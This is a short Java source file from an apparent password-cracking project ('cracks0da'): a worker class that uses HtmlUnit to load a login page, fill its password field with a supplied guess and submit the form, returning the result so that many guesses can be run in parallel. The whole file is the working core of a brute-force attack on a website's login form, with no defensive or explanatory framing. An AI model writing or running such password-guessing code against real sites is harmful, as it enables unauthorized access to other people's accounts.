package pw.haze.cracks0da;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.*;
import com.sun.tools.javac.util.Pair;

import java.io.IOException;
import java.util.Optional;
import java.util.concurrent.Callable;

/**
 * @author haze
 * @since 7/11/16
 */
public class CrackSodaWorker implements Callable<Optional<HtmlPage>> {

    private String guess;
    private WebClient webClient;
    private String url;

    public CrackSodaWorker(String guess, WebClient webClient, String url) {
        this.guess = guess;
        this.webClient = webClient;
        this.url = url;
    }

    @Override
    public Optional<HtmlPage> call() throws Exception {
        try {

            final HtmlPage page = webClient.getPage(this.url);
            for(HtmlForm form : page.getForms()) {
                if(form.getId().equals("login_form")) {
                    final HtmlForm loginForm = form;
                    final HtmlPasswordInput  passwordField = loginForm.getInputByName("password");
                    final HtmlSubmitInput enterButton = loginForm.getInputByName("commit");
                    passwordField.setValueAttribute(guess);
                    return Optional.of(enterButton.click());
                }
            }
            return Optional.empty();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Optional.empty();
    }

}
